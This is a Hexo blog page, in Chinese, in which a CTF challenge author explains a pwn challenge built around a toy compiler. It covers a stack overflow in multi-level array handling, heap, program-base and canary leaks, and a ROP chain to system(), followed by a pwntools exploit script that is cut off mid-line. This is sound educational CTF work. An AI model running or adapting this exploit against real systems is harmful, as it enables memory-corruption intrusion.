@@ -1,0 +1,515 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="Compiler 出题思路 本题目是一个我自己写的编译器，将其包装成菜单，并提供了以下4个功能： 123451.get IR2.get asm3.get bin4.input code5.exit  获取中间代码 获取汇编代码 获取二进制文件 输入源代码  由于 “获取汇编代码” 这个功能会被逆向题目 SycLang 利用，于是本题目不提供 trans_asm 文件 12345678910case">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Compiler出题思路">
+<meta property="og:url" content="http://example.com/2023/06/21/Compiler%E5%87%BA%E9%A2%98%E6%80%9D%E8%B7%AF/index.html">
+<meta property="og:site_name" content="Pwn进你的心">
+<meta property="og:description" content="Compiler 出题思路 本题目是一个我自己写的编译器，将其包装成菜单，并提供了以下4个功能： 123451.get IR2.get asm3.get bin4.input code5.exit  获取中间代码 获取汇编代码 获取二进制文件 输入源代码  由于 “获取汇编代码” 这个功能会被逆向题目 SycLang 利用，于是本题目不提供 trans_asm 文件 12345678910case">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-06-21T02:13:08.000Z">
+<meta property="article:modified_time" content="2023-06-21T02:15:56.009Z">
+<meta property="article:author" content="yhellow">
+<meta property="article:tag" content="Compilers Principles">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/2023/06/21/Compiler%E5%87%BA%E9%A2%98%E6%80%9D%E8%B7%AF/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>Compiler出题思路 | Pwn进你的心</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Pwn进你的心</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/06/21/Compiler%E5%87%BA%E9%A2%98%E6%80%9D%E8%B7%AF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="yhellow">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pwn进你的心">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Compiler出题思路
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2023-06-21 10:13:08 / Modified: 10:15:56" itemprop="dateCreated datePublished" datetime="2023-06-21T10:13:08+08:00">2023-06-21</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF-Challenge/" itemprop="url" rel="index"><span itemprop="name">CTF Challenge</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+              <span>7.4k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+              <span>7 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p><strong>Compiler 出题思路</strong></p>
+<p>本题目是一个我自己写的编译器，将其包装成菜单，并提供了以下4个功能：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>get IR</span><br><span class="line"><span class="number">2.</span>get <span class="keyword">asm</span></span><br><span class="line"><span class="number">3.</span>get bin</span><br><span class="line"><span class="number">4.</span>input code</span><br><span class="line"><span class="number">5.</span><span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>获取中间代码</li>
+<li>获取汇编代码</li>
+<li>获取二进制文件</li>
+<li>输入源代码</li>
+</ul>
+<p>由于 “获取汇编代码” 这个功能会被逆向题目 SycLang 利用，于是本题目不提供 trans_asm 文件</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">  sub_CB6A(<span class="string">&quot;translation Three-address-codes to Assemble-code&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;./trans_asm&quot;</span>);</span><br><span class="line">  sub_CB6A(<span class="string">&quot;done: get demo.s&quot;</span>);</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">  sub_CB6A(<span class="string">&quot;translation Assemble-code to Binary-code&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;gcc demo.s -o demo&quot;</span>);</span><br><span class="line">  sub_CB6A(<span class="string">&quot;done: get demo&quot;</span>);</span><br><span class="line">  <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>PS：这里偷个懒，后端直接就是 gcc，同时这里也提供了 system 函数</li>
+</ul>
+<p><strong>漏洞分析</strong></p>
+<p>本题目有两处溢出：</p>
+<p>本题目在词法分析的过程中，对符号的长度和数目没有限制，但符号表却非常长，在这里进行入侵不太现实</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.bss:<span class="number">0000000000020001</span> ?? ?? ?? ?? ?? ?? ?? ?? ?? ??+qword_20001 dq <span class="number">30</span><span class="function">DBh <span class="title">dup</span><span class="params">(?)</span>                         </span>; <span class="number">0</span></span><br><span class="line">.bss:<span class="number">0000000000020001</span> ?? ?? ?? ?? ?? ?? ?? ?? ?? ??+                                        ; DATA XREF: .rodata:off_13000↑o</span><br><span class="line">.bss:<span class="number">00000000000386</span>D9 ??                            db    ? ;</span><br><span class="line">.bss:<span class="number">00000000000386</span>DA ??                            db    ? ;</span><br><span class="line">.bss:<span class="number">00000000000386</span>DB ??                            db    ? ;</span><br><span class="line">.bss:<span class="number">00000000000386</span>DC ??                            db    ? ;</span><br><span class="line">.bss:<span class="number">00000000000386</span>DD ??                            db    ? ;</span><br><span class="line">.bss:<span class="number">00000000000386</span>DE ??                            db    ? ;</span><br><span class="line">.bss:<span class="number">00000000000386</span>DF ??                            db    ? ;</span><br></pre></td></tr></table></figure>
+<p>另外一处就是位于多级数组处理的栈溢出：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sub_427C(*(_QWORD *)(*(_QWORD *)(v15 + <span class="number">104</span>) + <span class="number">96LL</span>));</span><br><span class="line"><span class="keyword">if</span> ( **(_DWORD **)(*(_QWORD *)(v15 + <span class="number">104</span>) + <span class="number">96LL</span>) == <span class="number">258</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v18[v10++] = *(_DWORD *)(*(_QWORD *)(*(_QWORD *)(v15 + <span class="number">104</span>) + <span class="number">96LL</span>) + <span class="number">40LL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>这里原本的逻辑就是记录多级数组每一级的容量，如果多级数组的级数过多就会发生栈溢出</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> v18[<span class="number">6</span>]; <span class="comment">// [rsp+4Ah] [rbp-16h]</span></span><br><span class="line"><span class="keyword">void</span> *v19; <span class="comment">// [rsp+50h] [rbp-10h]</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>这里的 v19 是一个结构体指针，其目的是为了记录以变量为索引的数组（例如：<code>arr[i]</code> 中的 <code>i</code> 就会被进行记录）</li>
+</ul>
+<p>下面是这个结构体的源码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">Value</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> type_id[<span class="number">32</span>]; </span><br><span class="line">    <span class="keyword">int</span> type_int;     </span><br><span class="line">    <span class="keyword">float</span> type_float;</span><br><span class="line">    <span class="keyword">char</span> type_char;</span><br><span class="line">    <span class="keyword">char</span> type_string[<span class="number">32</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Array</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> kind;</span><br><span class="line">    <span class="keyword">int</span> index;</span><br><span class="line">    <span class="keyword">size_t</span> offset;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">Value</span> <span class="title">value</span>;</span></span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">32</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Array</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>Array-&gt;name 存储有该符号的名称，它可以在多个地方被打印</li>
+</ul>
+<p>由于栈溢出，v19 可以被覆盖低位，进而将 Array-&gt;name 控制为我们需要的值</p>
+<p>本程序有两处地方可供泄露：</p>
+<p>当 Array-&gt;name 与符号表中的所有符号都不匹配时，就会发出报错：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">v13 = sub_33AB(v14 + <span class="number">48</span>);</span><br><span class="line"><span class="keyword">if</span> ( v13 == <span class="number">-1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  sub_3373(*(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(*(_QWORD *)(a1 + <span class="number">96</span>) + <span class="number">200LL</span>), v14 + <span class="number">48</span>, <span class="string">&quot;未定义，语义错误&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v16;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>在报错中会输出该符合的名称 Array-&gt;name</li>
+</ul>
+<p>当 Array-&gt;name 与符号表中任意一个符号匹配时，就会将其输出：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; *(_DWORD *)(v11 + <span class="number">4</span>) - <span class="number">1</span>; ++i )</span><br><span class="line">  qword_19180 *= byte_19310[<span class="number">128</span> * (__int64)v7 + *(_DWORD *)(v11 + <span class="number">4</span>) - i];</span><br><span class="line"><span class="built_in">sprintf</span>(byte_190E0, <span class="string">&quot;&#123;#%d&#125;*&#123;%s&lt;+%d&gt;&#125;+&quot;</span>, qword_19180, (<span class="keyword">const</span> <span class="keyword">char</span> *)(v11 + <span class="number">16</span>), *(_QWORD *)(v11 + <span class="number">8</span>));</span><br><span class="line"><span class="built_in">strcat</span>(dest, byte_190E0);</span><br></pre></td></tr></table></figure>
+<p><strong>入侵思路</strong></p>
+<p>先通过栈溢出覆盖 Array 指针的低位，控制 Array-&gt;name 指向一个堆地址，进而泄露 heap_base</p>
+<p>本程序在拷贝数据时没有进行初始化，因此有部分栈上的数据被拷贝到堆中，这些数据都可以通过 Array-&gt;name 进行泄露</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; canary </span><br><span class="line">canary : <span class="number">0x2ece71e5ac86af00</span></span><br><span class="line">pwndbg&gt; search -t qword <span class="number">0x2ece71e5ac86af00</span></span><br><span class="line">Searching <span class="keyword">for</span> value: b<span class="number">&#x27;</span>\x00\xaf\x86\xac\xe5q\xce<span class="number">.&#x27;</span></span><br><span class="line">[heap]          <span class="number">0x55f0ee3be940</span> <span class="number">0x2ece71e5ac86af00</span></span><br><span class="line">[heap]          <span class="number">0x55f0ee3be9f8</span> <span class="number">0x2ece71e5ac86af00</span></span><br><span class="line">[heap]          <span class="number">0x55f0ee3bea30</span> <span class="number">0x2ece71e5ac86af00</span></span><br></pre></td></tr></table></figure>
+<p>获取 heap_base 后，就可以将 Array-&gt;name 指向更大范围的堆空间，进而泄露 pro_base，canary</p>
+<p>最后利用现成的 system 布置一个 ROP 就结束了</p>
+<p>完整 exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./trans_IR&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;libc-2.31.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.77.77&#x27;</span>,<span class="string">&#x27;2102&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x72EC)\n&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;5.exit&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line">code = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">int main()&#123;</span></span><br><span class="line"><span class="string">    int a;</span></span><br><span class="line"><span class="string">    struct test t;</span></span><br><span class="line"><span class="string">	int arr[255][255][255][255][255][255][255];</span></span><br><span class="line"><span class="string">    arr[32][255][255][255][255][255][a]=0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">cmd(<span class="number">4</span>)	</span><br><span class="line">sla(<span class="string">&quot;input code:&quot;</span>,code)</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;第6行：&quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">heap_base = leak_addr - <span class="number">0xa970</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">code = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">int main()&#123;</span></span><br><span class="line"><span class="string">    int a;</span></span><br><span class="line"><span class="string">    struct test t;</span></span><br><span class="line"><span class="string">	int arr[255][255][255][255][255][255][255];</span></span><br><span class="line"><span class="string">    arr[48][255][255][255][255][255][a]=0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">cmd(<span class="number">4</span>)	</span><br><span class="line">sla(<span class="string">&quot;input code:&quot;</span>,code)</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;第6行：&quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">pro_base = leak_addr - <span class="number">0xa10a</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;pro_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(pro_base))</span><br><span class="line"></span><br><span class="line">bss_addr = pro_base + <span class="number">0x19040</span> + <span class="number">0x200</span></span><br><span class="line">system = pro_base + <span class="number">0xCD92</span></span><br><span class="line">pop_rdi = pro_base + <span class="number">0x00000000000125b3</span></span><br><span class="line">success(<span class="string">&quot;system &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line">success(<span class="string">&quot;pop_rdi &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(pop_rdi))</span><br><span class="line"></span><br><span class="line">stack_heap = heap_base + <span class="number">0x11f20</span> +<span class="number">1</span>-<span class="number">0x30</span> </span><br><span class="line">success(<span class="string">&quot;stack_heap &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(stack_heap))</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">stack_heaps = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    stack_heaps.append((stack_heap&gt;&gt;(<span class="number">8</span>*i)) % <span class="number">256</span>)</span><br><span class="line"><span class="built_in">print</span>(stack_heaps)</span><br><span class="line"></span><br><span class="line">code = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">int main()&#123;</span></span><br><span class="line"><span class="string">    int a;</span></span><br><span class="line"><span class="string">    struct test t;</span></span><br><span class="line"><span class="string">	int arr[255][255][255][255][255][255][255][255][255];</span></span><br><span class="line"><span class="string">    arr[%s][%s][%s][255][255][255][255][255][a]=0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span> % (stack_heaps[<span class="number">2</span>],stack_heaps[<span class="number">1</span>],stack_heaps[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">cmd(<span class="number">4</span>)	</span><br><span class="line">sla(<span class="string">&quot;input code:&quot;</span>,code)</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;第6行：&quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">7</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">canary_stack = leak_addr * <span 